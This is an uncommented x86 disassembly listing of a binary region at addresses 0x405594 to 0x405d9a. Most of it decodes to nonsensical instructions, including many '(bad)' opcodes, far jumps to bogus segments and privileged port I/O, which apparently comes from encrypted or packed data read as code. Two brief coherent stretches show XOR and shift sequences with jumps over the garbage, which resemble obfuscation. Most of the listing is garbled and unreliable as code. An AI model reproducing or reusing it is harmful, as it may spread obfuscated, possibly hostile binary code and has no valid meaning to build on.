  405594:	jne    0x405549
  405596:	and    cl,al
  405598:	int    0x1a
  40559a:	and    ecx,0x4431928b
  4055a0:	adc    DWORD PTR [ecx],esp
  4055a2:	cmp    eax,DWORD PTR [ecx]
  4055a4:	fdivr  QWORD PTR [ebx+edx*1-0x2d88c8bf]
  4055ab:	(bad)  
  4055ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055ad:	mov    ds,WORD PTR [esp+ebx*1-0x16]
  4055b1:	loop   0x40560b
  4055b3:	dec    ebp
  4055b4:	cli    
  4055b5:	test   DWORD PTR [edx+0x4a786437],esi
  4055bb:	dec    edi
  4055bc:	jns    0x4055b1
  4055be:	inc    eax
  4055bf:	arpl   WORD PTR [edi+0x17],ax
  4055c2:	call   0x9de9:0x5591c6a8
  4055c9:	xor    DWORD PTR [ebx-0x6f],esi
  4055cc:	mov    BYTE PTR [esi-0x70],al
  4055cf:	int3   
  4055d0:	cmp    ch,al
  4055d2:	call   FWORD PTR [eax-0xf]
  4055d5:	jnp    0x4055dd
  4055d7:	jge    0x405632
  4055d9:	mov    ebx,0xf9fefe1f
  4055de:	jne    0x4055f6
  4055e0:	popa   
  4055e1:	mov    esi,0xda845037
  4055e6:	test   al,0x1e
  4055e8:	out    0xf8,eax
  4055ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055eb:	ret    
  4055ec:	cmp    eax,DWORD PTR [ecx]
  4055ee:	test   cl,0xa0
  4055f1:	imul   ebp,DWORD PTR ds:0x62ba7289,0xc22d624c
  4055fb:	adc    ch,al
  4055fd:	(bad)  
  4055fe:	push   esi
  4055ff:	push   0xffffff8d
  405601:	ret    0x6dd9
  405604:	cmc    
  405605:	ss in  al,dx
  405607:	adc    eax,0xb3226122
  40560c:	cli    
  40560d:	std    
  40560e:	jae    0x405663
  405610:	adc    eax,0x91edbaab
  405615:	iret   
  405616:	cmp    eax,0xe0a73dd4
  40561b:	jns    0x40560a
  40561d:	nop
  40561e:	stos   DWORD PTR es:[edi],eax
  40561f:	cmp    edx,esp
  405621:	dec    edi
  405622:	pop    esi
  405623:	and    edx,DWORD PTR [ecx+0x51]
  405626:	aaa    
  405627:	jae    0x4055fb
  405629:	sub    al,0x56
  40562b:	sub    BYTE PTR ds:[edi-0x5db0326d],0xd2
  405633:	sbb    esi,DWORD PTR [esi-0x7f]
  405636:	jmp    0x4056ac
  405638:	cmp    bl,bl
  40563a:	push   ebx
  40563b:	adc    al,0x76
  40563d:	jns    0x40567a
  40563f:	out    0x54,al
  405641:	into   
  405642:	xor    al,BYTE PTR [esi-0x52c2eaed]
  405648:	ss inc edi
  40564a:	scas   al,BYTE PTR es:[edi]
  40564b:	push   0xc989b809
  405650:	out    dx,eax
  405651:	xchg   edi,eax
  405652:	jl     0x405608
  405654:	jne    0x4056b0
  405656:	cli    
  405657:	mov    ebp,0x30e545da
  40565c:	gs pop ebx
  40565e:	rcl    ebp,0x83
  405661:	loope  0x405666
  405663:	inc    ecx
  405664:	mov    ebx,0xf5ee500c
  405669:	adc    ch,BYTE PTR ds:[ecx]
  40566c:	pushf  
  40566d:	sub    bl,cl
  40566f:	mov    esp,0x80190902
  405674:	in     eax,0x5e
  405676:	int3   
  405677:	dec    ecx
  405678:	loop   0x4056b5
  40567a:	aaa    
  40567b:	scas   eax,DWORD PTR es:[edi]
  40567c:	and    cl,ch
  40567e:	jbe    0x405616
  405680:	out    0x51,al
  405682:	and    eax,0xd024069e
  405687:	jge    0x40569d
  405689:	jmp    0xc375:0x27789a3
  405690:	outs   dx,DWORD PTR ds:[esi]
  405691:	xchg   ebp,eax
  405692:	in     eax,0xa4
  405694:	les    ebx,FWORD PTR [edx+eax*1+0x260d0f6]
  40569b:	stos   DWORD PTR es:[edi],eax
  40569c:	aaa    
  40569d:	push   cs
  40569e:	jecxz  0x405667
  4056a0:	stos   DWORD PTR es:[edi],eax
  4056a1:	add    ecx,ebx
  4056a3:	lea    ebx,[edi]
  4056a5:	push   ebx
  4056a6:	(bad)  
  4056a7:	dec    esi
  4056a8:	cmp    DWORD PTR [eax],esi
  4056aa:	dec    DWORD PTR [ebp-0x11]
  4056ad:	mov    eax,ds:0x5394df7d
  4056b2:	dec    ecx
  4056b3:	in     eax,dx
  4056b4:	ret    
  4056b5:	and    BYTE PTR [ebp-0x42],cl
  4056b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056b9:	mov    esi,0x572ccb09
  4056be:	iret   
  4056bf:	call   0x1fd85442
  4056c4:	adc    eax,0x1a31563a
  4056c9:	inc    edx
  4056ca:	pop    ss
  4056cb:	dec    ecx
  4056cc:	retf   
  4056cd:	adc    al,0xc3
  4056cf:	mov    esi,0x4ac40b5c
  4056d4:	push   eax
  4056d5:	int3   
  4056d6:	dec    ebx
  4056d7:	inc    eax
  4056d8:	pop    eax
  4056d9:	cld    
  4056da:	jmp    0x405752
  4056dc:	mov    ebp,0x5e97a5ba
  4056e1:	push   esi
  4056e2:	cdq    
  4056e3:	mov    bh,0xd4
  4056e5:	dec    ecx
  4056e6:	sahf   
  4056e7:	adc    DWORD PTR [eax+0x6e],edx
  4056ea:	xchg   esp,eax
  4056eb:	xchg   ebx,eax
  4056ec:	imul   ebx,ebx,0x117f1791
  4056f2:	and    ebp,esp
  4056f4:	fwait
  4056f5:	mov    edx,0xe457676d
  4056fa:	or     dh,BYTE PTR [edx-0x33]
  4056fd:	lds    edi,FWORD PTR [edx+0x66ba7ce]
  405703:	loop   0x4056fe
  405705:	dec    edx
  405706:	imul   ecx,DWORD PTR ds:[ebx+0x18],0xffffffee
  40570b:	xchg   ch,ah
  40570d:	dec    ebx
  40570e:	ficomp DWORD PTR [ebx+0x10f5f578]
  405714:	fstp   TBYTE PTR [esi+0x1fa7413f]
  40571a:	pop    edi
  40571b:	push   ebp
  40571c:	int3   
  40571d:	pop    esp
  40571e:	xchg   esi,eax
  40571f:	cmp    al,0x45
  405721:	in     al,0x8a
  405723:	mov    eax,ds:0x49016be0
  405728:	cs and WORD PTR fs:[edx+0x28ad1bc],si
  405731:	mov    al,ds:0x62b4728f
  405736:	jnp    0x40573c
  405738:	(bad)  
  405739:	xlat   BYTE PTR ds:[ebx]
  40573a:	fldenv [eax]
  40573c:	add    BYTE PTR [ebp-0x3dbf82a3],dh
  405742:	add    BYTE PTR [ecx+0x271726c4],0x65
  405749:	cmp    al,0x86
  40574b:	mov    cs,ecx
  40574d:	push   DWORD PTR [edx+0x1c8dcfae]
  405753:	jg     0x405784
  405755:	add    bl,dl
  405757:	sbb    esp,DWORD PTR fs:[edi+0x30]
  40575b:	dec    ebx
  40575c:	icebp  
  40575d:	cmp    ebp,DWORD PTR [edx-0x5d7434d4]
  405763:	and    DWORD PTR [edx+0x2d90369c],eax
  405769:	es sub eax,0x761f068d
  40576f:	in     eax,0xba
  405771:	sub    eax,0x765c1d6
  405776:	pop    ds
  405777:	(bad)  
  405778:	(bad)  [ebx+0x3]
  40577b:	jns    0x4057ca
  40577d:	mov    cl,0xc9
  40577f:	sahf   
  405780:	(bad)  
  405782:	pop    ecx
  405783:	fs mov dl,0x71
  405786:	(bad)  
  405788:	cmp    eax,0xbd0116fa
  40578d:	scas   eax,DWORD PTR es:[edi]
  40578e:	mov    esp,DWORD PTR [edx-0x30]
  405791:	adc    eax,0x365502d4
  405796:	sub    BYTE PTR [edx],dl
  405798:	stc    
  405799:	stos   DWORD PTR es:[edi],eax
  40579a:	(bad)  
  40579b:	fdivr  st(7),st
  40579d:	or     ch,BYTE PTR [ebx*2-0x4835ea93]
  4057a4:	loop   0x405772
  4057a6:	mov    cl,0xe8
  4057a8:	jo     0x4057a3
  4057aa:	pushf  
  4057ab:	int3   
  4057ac:	ins    DWORD PTR es:[edi],dx
  4057ad:	xchg   BYTE PTR [eax],ah
  4057af:	test   DWORD PTR [ecx+edx*2+0x451ca3af],edi
  4057b6:	adc    ch,bh
  4057b8:	adc    al,BYTE PTR [ebp+0x52cbdb03]
  4057be:	and    eax,0x4988eb9c
  4057c3:	jmp    0x9978:0x9cd5d29c
  4057ca:	aas    
  4057cb:	push   0x7ee1f171
  4057d0:	jnp    0x4057de
  4057d2:	xchg   ecx,eax
  4057d3:	inc    edi
  4057d4:	jnp    0x405778
  4057d6:	sub    DWORD PTR [ebp+edi*8+0xa],esi
  4057da:	pushf  
  4057db:	jl     0x4057b0
  4057dd:	jne    0x405847
  4057df:	mov    eax,ds:0xa8c91c81
  4057e4:	es test al,ah
  4057e7:	aaa    
  4057e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ea:	sbb    al,0x0
  4057ec:	les    edx,FWORD PTR [edi+edx*2+0x66]
  4057f0:	push   0xf6329d93
  4057f5:	xchg   BYTE PTR [edi],dh
  4057f7:	faddp  st(6),st
  4057f9:	inc    esi
  4057fa:	fwait
  4057fb:	adc    BYTE PTR [edi],bl
  4057fd:	and    al,0xa4
  4057ff:	repz rcl BYTE PTR [bp+di+0x809],0xb6
  405806:	push   ebx
  405807:	cmp    al,0xe5
  405809:	iret   
  40580a:	push   ebp
  40580b:	jle    0x40579b
  40580d:	fldcw  WORD PTR [esi+ebx*2+0x4f]
  405811:	int3   
  405812:	jp     0x4057e2
  405814:	push   edi
  405815:	push   ecx
  405816:	lahf   
  405817:	xchg   BYTE PTR [edx],ah
  405819:	rol    BYTE PTR [esi+0x7e],cl
  40581c:	push   esi
  40581d:	inc    eax
  40581e:	add    edx,esp
  405820:	xchg   esp,eax
  405821:	and    al,0xca
  405823:	icebp  
  405824:	add    DWORD PTR [eax],0xe496cd01
  40582a:	pop    ecx
  40582b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40582c:	jp     0x40580e
  40582e:	icebp  
  40582f:	int3   
  405830:	int3   
  405831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405832:	pop    ecx
  405833:	lds    ebx,FWORD PTR ds:0x9653f730
  405839:	sbb    cl,BYTE PTR [ebx+0x1df70456]
  40583f:	jnp    0x4057c4
  405841:	inc    edx
  405842:	add    BYTE PTR [ecx+0x3d83d44d],cl
  405848:	add    DWORD PTR [bp+si+0x0],0x5705c700
  405850:	add    BYTE PTR [edx+0x0],0x40
  405854:	add    eax,0x27b90000
  405859:	add    al,0x0
  40585b:	add    BYTE PTR [edx+0x7aa7],bh
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428257,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428167,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e64
  40588d:	adc    DWORD PTR ds:0x4282fb,edx
  405893:	or     DWORD PTR ds:0x42822b,0x369f
  40589d:	neg    DWORD PTR ds:0x42816b
  4058a3:	sub    DWORD PTR ds:0x42814b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x4058c1
  405910:	arpl   WORD PTR [ebx],sp
  405912:	stos   BYTE PTR es:[edi],al
  405913:	ins    DWORD PTR es:[edi],dx
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi+0x21181812],bl
  40591c:	xor    al,0x42
  40591e:	daa    
  40591f:	std    
  405920:	dec    esp
  405921:	daa    
  405922:	pop    eax
  405923:	or     al,BYTE PTR [ebx-0x49]
  405926:	in     al,0x6c
  405928:	push   ecx
  405929:	loope  0x405971
  40592b:	mov    bh,BYTE PTR [ebx-0x290976a5]
  405931:	es xchg ecx,eax
  405933:	lock pop ecx
  405935:	push   ebx
  405936:	adc    al,0xaa
  405938:	icebp  
  405939:	int    0x60
  40593b:	out    dx,eax
  40593c:	sub    al,dh
  40593e:	or     BYTE PTR ds:0xc87daf67,bh
  405944:	es or  bh,bh
  405947:	bound  edx,QWORD PTR [edx]
  405949:	fsub   QWORD PTR [ecx+ebx*2]
  40594c:	sti    
  40594d:	push   ebx
  40594e:	into   
  40594f:	pop    ss
  405950:	mov    bh,0xf
  405952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405953:	mov    eax,0x87442b83
  405958:	imul   ebx,DWORD PTR [edi+0xd],0x72e81081
  40595f:	sub    BYTE PTR [ebx+0x5e],0xe7
  405963:	inc    ecx
  405964:	or     al,ah
  405966:	push   0xcf063586
  40596b:	out    dx,eax
  40596c:	pop    ecx
  40596d:	jge    0x4058f1
  40596f:	daa    
  405970:	pop    esp
  405971:	mov    edi,0xfd2a3282
  405976:	ret    
  405977:	sahf   
  405978:	push   ebx
  405979:	cmp    al,0x84
  40597b:	xchg   ebx,eax
  40597c:	xor    edi,ebx
  40597e:	shl    bh,1
  405980:	bt     DWORD PTR [ebp+0x416691c4],ebx
  405987:	mov    ah,0x58
  405989:	and    ah,cl
  40598b:	add    al,0xd
  40598d:	cli    
  40598e:	(bad)  
  40598f:	mov    ds:0x82ad9b3c,al
  405994:	dec    ecx
  405995:	in     al,0x5c
  405997:	sti    
  405998:	lds    eax,FWORD PTR [edi+0x2b]
  40599b:	xor    bl,BYTE PTR [eax+0x73]
  40599e:	scas   eax,DWORD PTR es:[edi]
  40599f:	leave  
  4059a0:	std    
  4059a1:	cmp    DWORD PTR [ecx+0x34],0x2dd091c5
  4059a8:	rcl    bl,cl
  4059aa:	and    eax,0xc6d0fba9
  4059af:	lahf   
  4059b0:	(bad)  
  4059b2:	adc    bh,dh
  4059b4:	imul   esi,ebx,0xe6fbe412
  4059ba:	les    esi,FWORD PTR [edx]
  4059bc:	sbb    BYTE PTR [esi+0x4ecc5af5],al
  4059c2:	adc    al,0x2e
  4059c4:	dec    edi
  4059c5:	jae    0x405a13
  4059c7:	dec    esi
  4059c8:	dec    ecx
  4059c9:	dec    esi
  4059ca:	ins    BYTE PTR es:[edi],dx
  4059cb:	mov    DWORD PTR [ebp-0x7f],eax
  4059ce:	or     eax,0x4a3910db
  4059d3:	pop    edx
  4059d4:	mov    BYTE PTR [edx],dl
  4059d6:	mov    BYTE PTR [edx-0x63],0xc3
  4059da:	loop   0x40598b
  4059dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059dd:	int3   
  4059de:	jno    0x4059ad
  4059e0:	or     DWORD PTR [ecx],esp
  4059e2:	mov    dh,0x2a
  4059e4:	fwait
  4059e5:	jge    0x4059f6
  4059e7:	scas   eax,DWORD PTR es:[di]
  4059e9:	jbe    0x405996
  4059eb:	or     al,BYTE PTR [esi-0x47]
  4059ee:	es addr16 mov dh,0x2a
  4059f2:	cmp    DWORD PTR [esi+0x55],esp
  4059f5:	in     eax,0x2
  4059f7:	cmp    edx,edx
  4059f9:	push   0xffffffab
  4059fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059fc:	cwde   
  4059fd:	cwde   
  4059fe:	push   DWORD PTR [ebp+0x16]
  405a01:	inc    esi
  405a02:	inc    eax
  405a03:	add    BYTE PTR [ebx],0x3a
  405a06:	mov    al,0xbb
  405a08:	and    bl,BYTE PTR cs:[esi+0xf]
  405a0c:	out    0xfc,al
  405a0e:	jmp    0xe425:0xe53908f2
  405a15:	push   0x147086dd
  405a1a:	neg    BYTE PTR [edi-0x71946397]
  405a20:	fldcw  WORD PTR [ebp+0x1cb70cdf]
  405a26:	in     al,dx
  405a27:	(bad)  
  405a28:	dec    dh
  405a2a:	test   eax,0x7b45e237
  405a2f:	xchg   edx,eax
  405a30:	jb     0x405a85
  405a32:	pop    edi
  405a33:	pop    esi
  405a34:	jo     0x405a28
  405a36:	cwde   
  405a37:	pop    edi
  405a38:	les    ebx,FWORD PTR [esi+0xf12d488]
  405a3e:	sbb    BYTE PTR [eax+esi*2],cl
  405a41:	mov    BYTE PTR [eax],ch
  405a43:	jmp    0x4717:0xf9b0b3e2
  405a4a:	push   0x82fdbf2f
  405a4f:	sub    ah,cl
  405a51:	mov    al,0x7d
  405a53:	ss cwde 
  405a55:	sub    al,0x44
  405a57:	mov    BYTE PTR [esi],al
  405a59:	lds    esp,FWORD PTR [edx+ebx*8-0x61d799b5]
  405a60:	hlt    
  405a61:	and    BYTE PTR [esi],dl
  405a63:	fmul   DWORD PTR [ebp+0xb]
  405a66:	cmp    al,0x72
  405a68:	cwde   
  405a69:	pop    ecx
  405a6a:	cwde   
  405a6b:	mov    eax,0xf10fa921
  405a70:	scas   eax,DWORD PTR es:[edi]
  405a71:	retf   0x6298
  405a74:	mov    edi,0x2b0b30d4
  405a79:	push   ds
  405a7a:	or     ah,ch
  405a7c:	jecxz  0x405afd
  405a7e:	lods   al,BYTE PTR ds:[esi]
  405a7f:	(bad)  
  405a80:	mov    al,ds:0x2fbd99b7
  405a85:	mov    ah,0x21
  405a87:	fisub  WORD PTR [edi+0xb]
  405a8a:	call   esi
  405a8c:	ret    
  405a8d:	das    
  405a8e:	and    al,0x51
  405a90:	cmp    cl,0x7d
  405a93:	mov    bl,0xe4
  405a95:	fld    QWORD PTR [ecx+0x7d]
  405a98:	sbb    eax,DWORD PTR [edx+0x28]
  405a9b:	push   ss
  405a9c:	int    0xf6
  405a9e:	scas   eax,DWORD PTR es:[edi]
  405a9f:	jge    0x405a6e
  405aa1:	inc    ebp
  405aa2:	sbb    dl,BYTE PTR [ebx+0x27]
  405aa5:	xchg   esi,eax
  405aa6:	xchg   BYTE PTR [esi+edx*8-0xbb21c7b],cl
  405aad:	(bad)  
  405aae:	mov    esi,0x1056bcc5
  405ab3:	mov    DWORD PTR [eax],0x243742fe
  405ab9:	dec    edx
  405aba:	imul   DWORD PTR [edi]
  405abc:	xchg   edi,eax
  405abd:	jns    0x405af5
  405abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac0:	mov    edx,0xa604abe6
  405ac5:	inc    ebp
  405ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac7:	les    esp,FWORD PTR [ebx]
  405ac9:	mov    ebp,0x2f28d34
  405ace:	test   eax,0x25def85d
  405ad3:	fadd   QWORD PTR ds:0x77e577f9
  405ad9:	dec    ebx
  405ada:	pop    edx
  405adb:	and    dl,BYTE PTR [ecx*8+0x5cbb191b]
  405ae2:	int    0xd1
  405ae4:	or     eax,DWORD PTR [edi-0x51]
  405ae7:	sub    edx,DWORD PTR gs:[esi+0x2a]
  405aeb:	gs popf 
  405aed:	cmp    esp,DWORD PTR [ebp+0x41]
  405af0:	or     eax,0x648db884
  405af5:	leave  
  405af6:	and    DWORD PTR [esi],ecx
  405af8:	lahf   
  405af9:	fdivp  st(4),st
  405afb:	xchg   ecx,eax
  405afc:	repnz in eax,0xdf
  405aff:	pop    edx
  405b00:	pop    ds
  405b01:	imul   eax,DWORD PTR ds:0x4561a911,0xb896f0d5
  405b0b:	ins    BYTE PTR es:[edi],dx
  405b0c:	push   0x22
  405b0e:	out    0xca,eax
  405b10:	stos   BYTE PTR es:[edi],al
  405b11:	ja     0x405b53
  405b13:	mov    DWORD PTR [esi],0x9aad7392
  405b19:	jo     0x405ae1
  405b1b:	mov    BYTE PTR [esi-0x625d5e56],ah
  405b21:	or     al,0x9
  405b23:	push   ebx
  405b24:	pop    ebx
  405b25:	jb     0x405b36
  405b27:	scas   eax,DWORD PTR es:[edi]
  405b28:	push   0x2906da1a
  405b2d:	ret    
  405b2e:	fwait
  405b2f:	data16 icebp 
  405b31:	mov    ss,WORD PTR [esi+ebp*1+0x47]
  405b35:	nop
  405b36:	cmc    
  405b37:	jno    0x405b2d
  405b39:	fidiv  WORD PTR ds:0x1f58b72f
  405b3f:	(bad)  
  405b40:	loopne 0x405b73
  405b42:	add    DWORD PTR [esi],ecx
  405b44:	add    esp,esp
  405b46:	mov    eax,ds:0x46a4c96a
  405b4b:	sub    BYTE PTR [edx-0x6e337773],bl
  405b51:	xchg   eax,edx
  405b53:	scas   al,BYTE PTR es:[edi]
  405b54:	sbb    eax,0x734b3334
  405b59:	sbb    ch,ch
  405b5b:	pop    ebx
  405b5c:	gs icebp 
  405b5e:	push   edx
  405b5f:	cmp    BYTE PTR [esp+esi*4-0x8cebc3f],dl
  405b66:	push   ds
  405b67:	fldenv [edi+0x45]
  405b6a:	xchg   edi,eax
  405b6b:	jno    0x405b3a
  405b6d:	outs   dx,BYTE PTR ds:[esi]
  405b6e:	mov    edi,0x9344a412
  405b73:	call   0x624f411b
  405b78:	pop    ds
  405b79:	pop    edi
  405b7a:	inc    edx
  405b7b:	cmp    edi,DWORD PTR [eax]
  405b7d:	scas   al,BYTE PTR es:[edi]
  405b7e:	ficom  DWORD PTR [edi-0x8655386]
  405b84:	or     edi,DWORD PTR [ebp+0x71bf13a4]
  405b8a:	pop    ebp
  405b8b:	mov    gs,eax
  405b8d:	cli    
  405b8e:	out    0x8f,eax
  405b90:	out    dx,eax
  405b91:	ins    DWORD PTR es:[edi],dx
  405b92:	xor    esi,eax
  405b94:	adc    BYTE PTR [eax],0x34
  405b97:	cmp    eax,0x9ce64785
  405b9c:	mov    ds,WORD PTR [edi]
  405b9e:	jnp    0x405b74
  405ba0:	jo     0x405bd5
  405ba2:	(bad)  
  405ba3:	enter  0x1990,0x68
  405ba7:	das    
  405ba8:	push   cs
  405ba9:	mov    ds:0xb5852a58,al
  405bae:	rol    bl,cl
  405bb0:	and    al,0xdc
  405bb2:	jne    0x405b88
  405bb4:	mov    ch,0x24
  405bb6:	in     eax,0x76
  405bb8:	push   esp
  405bb9:	mov    ebx,0xb28c4250
  405bbe:	ja     0x405bfd
  405bc0:	fcom   st(4)
  405bc2:	call   0xb01c:0xc896d7ae
  405bc9:	mov    bl,ah
  405bcb:	mov    esp,0x30892ba9
  405bd0:	mov    bh,0x63
  405bd2:	call   0x61640319
  405bd7:	sbb    al,BYTE PTR [ecx-0x3064d6a6]
  405bdd:	inc    eax
  405bde:	xchg   BYTE PTR [edx-0x1a],dh
  405be1:	mov    edx,0xa9272fac
  405be6:	xchg   ecx,eax
  405be7:	and    al,0x7
  405be9:	fist   WORD PTR [eax]
  405beb:	pop    ecx
  405bec:	aad    0x87
  405bee:	and    al,0xc6
  405bf0:	sub    eax,0x675ee5a8
  405bf5:	ret    0x4371
  405bf8:	cmp    eax,0xe4cc7cc6
  405bfd:	mov    edi,0x489a8893
  405c02:	pop    es
  405c03:	into   
  405c04:	add    DWORD PTR [edx+0x6a],esp
  405c07:	repz push edi
  405c09:	scas   al,BYTE PTR es:[edi]
  405c0a:	jnp    0x405c17
  405c0c:	fisubr DWORD PTR [ebx]
  405c0e:	mov    edx,0xac2ea812
  405c13:	sbb    eax,0x3a3a3151
  405c18:	jle    0x405c27
  405c1a:	fldcw  WORD PTR ds:0x505f490b
  405c20:	xchg   ecx,eax
  405c21:	out    0x20,al
  405c23:	out    dx,al
  405c24:	test   dh,0xaf
  405c27:	mov    ds:0x868e7f00,al
  405c2c:	sbb    dh,dl
  405c2e:	xor    BYTE PTR [ebx+0x33],cl
  405c31:	shl    al,1
  405c33:	lds    ebx,FWORD PTR [edi]
  405c35:	or     BYTE PTR [ebp-0x5752483a],ch
  405c3b:	arpl   WORD PTR [edi+0x7d33ad6a],si
  405c41:	aaa    
  405c42:	sub    al,0xb0
  405c44:	ret    0xc856
  405c47:	pop    edi
  405c48:	aaa    
  405c49:	adc    dh,BYTE PTR [ecx+0xd4e3afe]
  405c4f:	aas    
  405c50:	jl     0x405ccc
  405c52:	jecxz  0x405bdb
  405c54:	mov    al,cl
  405c56:	dec    eax
  405c57:	inc    eax
  405c58:	and    bl,BYTE PTR [edx+eax*2]
  405c5b:	cmp    eax,0x66c6a43
  405c60:	push   es
  405c61:	inc    ecx
  405c62:	sbb    esi,0x83ebed2e
  405c68:	xor    DWORD PTR [edi+0x1868be6b],0xffffffaf
  405c6f:	sub    al,0x5f
  405c71:	mov    esi,0xf31c3e69
  405c76:	push   edx
  405c77:	cmp    ecx,DWORD PTR [edx-0x26a72979]
  405c7d:	adc    eax,edx
  405c7f:	sub    BYTE PTR [eax-0x167708eb],0xb7
  405c86:	add    BYTE PTR [ebp+0x48],al
  405c89:	div    cl
  405c8b:	cmp    ch,BYTE PTR [bx+si+0x7bb7]
  405c90:	or     BYTE PTR [ebx-0x2b],dh
  405c93:	add    BYTE PTR [edx],0x62
  405c96:	cmp    ah,bl
  405c98:	lods   eax,DWORD PTR ds:[esi]
  405c99:	mov    al,0x29
  405c9b:	lods   al,BYTE PTR ds:[esi]
  405c9c:	sub    ch,BYTE PTR [ebx-0x6e]
  405c9f:	adc    ebx,edx
  405ca1:	popf   
  405ca2:	mov    ecx,ecx
  405ca4:	jecxz  0x405cc9
  405ca6:	mov    esp,0x5fa84bb1
  405cab:	inc    BYTE PTR [ebx]
  405cad:	jecxz  0x405cd4
  405caf:	into   
  405cb0:	mov    ch,0x26
  405cb2:	addr16 inc ecx
  405cb4:	das    
  405cb5:	test   ebp,eax
  405cb7:	mov    ah,0x42
  405cb9:	pusha  
  405cba:	push   ecx
  405cbb:	add    al,0xb9
  405cbd:	call   0xd02d:0xfbfd45d7
  405cc4:	mov    edx,0x3a237a9b
  405cc9:	ds retf 
  405ccb:	es sub al,0x80
  405cce:	inc    edx
  405ccf:	popf   
  405cd0:	push   0x3251814b
  405cd5:	ds mov esi,0xe56164d7
  405cdb:	mov    cl,0x89
  405cdd:	inc    ebp
  405cde:	aam    0xc7
  405ce0:	inc    ebp
  405ce1:	loopne 0x405d54
  405ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce4:	jns    0x405cb0
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax-0x74],1
  405d2b:	mov    ebp,0xa9f2be31
  405d30:	sbb    BYTE PTR [eax],bl
  405d32:	sahf   
  405d33:	adc    bl,BYTE PTR [eax]
  405d35:	sbb    BYTE PTR [eax-0x1e099331],dh
  405d3b:	push   eax
  405d3c:	sbb    BYTE PTR [edx-0x564482dd],bh
  405d42:	pop    ds
  405d43:	fidiv  WORD PTR [edx+0x5ac6ba8e]
  405d49:	ret    
  405d4a:	aaa    
  405d4b:	cld    
  405d4c:	sub    al,0x63
  405d4e:	or     ecx,ebx
  405d50:	jo     0x405cf7
  405d52:	add    ecx,ebp
  405d54:	out    0x22,eax
  405d56:	lods   al,BYTE PTR ds:[esi]
  405d57:	bound  eax,QWORD PTR [eax-0x31]
  405d5a:	test   al,0xa1
  405d5c:	push   ds
  405d5d:	imul   ebp,edx,0x82a3e028
  405d63:	lahf   
  405d64:	mov    al,ds:0x27a948d4
  405d69:	ja     0x405dc2
  405d6b:	repz or DWORD PTR [esp+eax*1+0x6d10b831],eax
  405d73:	inc    di
  405d75:	loopne 0x405dbe
  405d77:	xor    bh,bl
  405d79:	push   ebp
  405d7a:	sti    
  405d7b:	fsub   DWORD PTR [eax+0x34]
  405d7e:	outs   dx,BYTE PTR ds:[esi]
  405d7f:	loop   0x405d8c
  405d81:	xchg   DWORD PTR [ebp+0x15],esp
  405d84:	xchg   ecx,eax
  405d85:	fsubr  QWORD PTR [edi+esi*1+0x6d]
  405d89:	inc    esi
  405d8a:	and    eax,0x9555a79f
  405d8f:	fsubr  DWORD PTR [esi+0x743905ce]
  405d95:	enter  0x2d43,0xbf
  405d99:	(bad)  
  405d9a:	bound  edx,QWORD PTR [ecx+0x7c891f38]
